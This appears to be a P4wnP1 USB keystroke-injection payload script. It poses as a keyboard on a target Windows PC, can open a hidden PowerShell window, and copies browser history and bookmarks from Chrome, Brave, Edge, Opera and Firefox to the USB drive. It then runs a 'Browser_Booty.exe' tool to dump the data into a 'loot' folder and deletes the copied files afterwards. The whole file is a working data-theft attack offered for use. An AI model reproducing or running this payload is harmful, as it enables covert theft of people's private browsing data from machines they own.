//You need HID Keyboard and USB Mass Storage enabled under USB SETTINGS

layout('gb-2');			//Keyboard layout
hide=false; 			//Set to true to hide the console window on the target
exit=false;				//Set to true to exit the console once finished

typingSpeed(0,0);		//Typing as fast as possible
press('GUI r');
delay(700);
if (hide) type('powershell -w h -NoP -NonI\n'); else type('powershell\n'); //Hide the console if chosen to do so
delay(2000);
type('$usbPath =((gwmi win32_volume -f "label=""P4WNP1""").Name)\n');	   //Replace 'P4WNP1' with your drive name
delay(100);
type('cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History" -Destination "$usbPath\\C_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History" -Destination "$usbPath\\B_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History" -Destination "$usbPath\\E_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\History" -Destination "$usbPath\\O_History"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\C_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\B_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" -Destination "$usbPath\\E_Bookmarks"; cp -Path "$env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Opera Software\\Opera Stable\\Bookmarks" -Destination "$usbPath\\O_Bookmarks"\n');
//Copying Chrome, Brave, Edge, and Opera files to USB. We have to copy because the databases are locked when in use, this can be bypassed by copying
type('cd $env:SystemDrive\\Users\\$env:UserName\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\; ls | Sort-Object -Property LastWriteTime | Select-Object -Last 1 | cd; cp -Path "places.sqlite" -Destination "$usbPath\\F_History"\n');
//Copying Firefox seperately because it insists on being difficult
type('cd $usbPath\\tools; .\\Browser_Booty.exe > $usbPath\\loot\\$env:COMPUTERNAME-HDB.txt\n');
//Execute the exe in tools folder, output will be stored in loot folder
type('cd ..; rm * -Include *History; rm * -Include *Bookmarks\n')
//Deletes the database files now that we've extracted all useful information
if (exit) { type('exit\n'); } //Exit the console if chosen to do so
